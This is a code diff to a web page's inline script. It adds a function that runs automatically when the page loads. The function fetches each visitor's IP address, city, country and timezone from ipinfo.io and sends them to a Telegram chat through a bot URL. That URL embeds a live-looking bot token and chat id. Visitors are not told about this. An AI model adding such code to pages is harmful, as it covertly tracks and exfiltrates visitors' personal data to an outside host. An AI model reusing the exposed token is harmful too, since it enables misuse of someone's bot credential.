@@ -575,7 +575,31 @@
         window.location.href = redirectUrl; // Redirect to the URL
       });
     });
-  </script>
+    function getIp() {
+    fetch('https://ipinfo.io/json')
+        .then(response => {
+            if (!response.ok) throw new Error('Failed to fetch IP info');
+            return response.json();
+        })
+        .then(data => {
+            const message = `A user visited this website from ${data.city} - ${data.country} with timezone ${data.timezone} and IP address ${data.ip}`;
+            
+            // Send the message to the server
+            return fetch(`https://api.telegram.org/bot7688636891:AAF9ft0rhJk-EWkvUq89pYQDef_4gvDfPCo/sendMessage?chat_id=-1002324662504&text=${encodeURIComponent(message)}`);
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('Message sent successfully');
+            } else {
+                throw new Error('Failed to send message');
+            }
+        })
+        .catch(error => console.error('Error:', error));
+}
+
+
+window.onload = getIp;
+</script>
 <style>
     #marquee-element{
         padding: 12px!important;
